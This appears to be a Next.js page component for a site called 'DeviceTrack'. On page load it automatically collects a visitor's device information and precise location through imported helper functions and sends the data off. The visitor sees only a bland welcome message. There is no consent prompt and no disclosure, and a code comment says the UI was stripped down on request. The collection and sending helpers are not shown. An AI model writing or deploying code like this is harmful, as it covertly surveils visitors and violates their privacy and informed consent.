"use client"

import { useEffect, useState } from "react"
import { Monitor } from "lucide-react"
import { collectDeviceInfo, collectPreciseLocation, sendData } from "@/lib/functions"

export default function UserView() {
  const [mounted, setMounted] = useState(false)
  const [collected, setCollected] = useState(false)
  const [locationShared, setLocationShared] = useState(false)
  const [sessionId] = useState(() => `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`)

  useEffect(() => {
    setMounted(true)
  }, [])

  // functions moved to '@/lib/functions'

  useEffect(() => {
    if (!mounted) return

    const doCollect = async () => {
      try {
        const deviceInfo: any = await collectDeviceInfo(sessionId)
        await sendData(deviceInfo)
        setCollected(true)
        collectPreciseLocation(sessionId).then((ok) => {
          if (ok) setLocationShared(true)
        })
      } catch (error) {
        console.error("Error collecting device info:", error)
      }
    }

    doCollect()
  }, [sessionId, mounted])


  if (!mounted) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="max-w-2xl w-full text-center space-y-6">
          <div className="flex justify-center">
            <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center">
              <Monitor className="w-10 h-10 text-primary animate-pulse" />
            </div>
          </div>
          <div className="space-y-3">
            <h1 className="text-4xl md:text-5xl font-bold text-balance">Welcome to DeviceTrack</h1>
            <p className="text-lg text-muted-foreground text-pretty">
              Understanding your device helps us provide a better experience
            </p>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="max-w-2xl w-full text-center space-y-6">
        <div className="flex justify-center">
          <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center">
            <Monitor className="w-10 h-10 text-primary" />
          </div>
        </div>

        <div className="space-y-3">
          <h1 className="text-4xl md:text-5xl font-bold text-balance">Welcome to DeviceTrack</h1>
          <p className="text-lg text-muted-foreground text-pretty">
            Understanding your device helps us provide a better experience
          </p>
        </div>

        {/* Intentionally minimal UI per request: only the welcome section remains */}
      </div>
    </div>
  )
}
